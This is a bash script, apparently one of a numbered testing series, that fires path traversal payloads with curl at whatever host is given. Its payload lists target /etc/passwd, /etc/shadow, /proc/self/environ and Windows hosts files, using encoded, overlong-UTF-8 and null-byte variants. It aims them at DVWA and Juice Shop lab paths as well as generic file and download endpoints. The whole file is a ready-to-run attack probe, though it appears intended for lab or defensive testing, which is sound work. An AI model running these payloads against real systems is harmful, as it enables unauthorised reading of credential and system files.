#!/bin/bash
# Path Traversal / Directory Traversal payload suite
# Tools: curl
# Targets: Various application endpoints
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 04-path-traversal.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Path Traversal suite against ${TARGET}"
echo ""

echo "[+] Sending path traversal payloads via curl..."

# Standard traversal payloads
PAYLOADS=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "../../../etc/shadow"
  "../../../etc/hosts"
  "../../../proc/self/environ"
  "../../../windows/system32/drivers/etc/hosts"
)

# URL-encoded variants
ENCODED_PAYLOADS=(
  "..%2F..%2F..%2Fetc%2Fpasswd"
  "..%252F..%252F..%252Fetc%252Fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
)

# Null-byte variants
NULLBYTE_PAYLOADS=(
  "../../../etc/passwd%00"
  "../../../etc/passwd%00.jpg"
  "../../../etc/passwd%00.html"
  "....//....//....//etc/passwd"
  "....//../....//../....//../etc/passwd"
)

# Test endpoints
ENDPOINTS=(
  "/juice-shop/ftp/"
  "/dvwa/vulnerabilities/fi/?page="
  "/api/files?path="
  "/download?file="
  "/static/"
  "/images/"
)

for endpoint in "${ENDPOINTS[@]}"; do
  echo "  Endpoint: ${endpoint}"

  for payload in "${PAYLOADS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
      "${BASE}${endpoint}${payload}" \
      --max-time 10) || code="ERR"
    echo "    [std] ${payload} -> HTTP ${code}"
  done

  for payload in "${ENCODED_PAYLOADS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
      "${BASE}${endpoint}${payload}" \
      --max-time 10 --path-as-is) || code="ERR"
    echo "    [enc] ${payload} -> HTTP ${code}"
  done

  for payload in "${NULLBYTE_PAYLOADS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
      "${BASE}${endpoint}${payload}" \
      --max-time 10 --path-as-is) || code="ERR"
    echo "    [nul] ${payload} -> HTTP ${code}"
  done

  echo ""
done

echo "[*] Path Traversal suite complete"
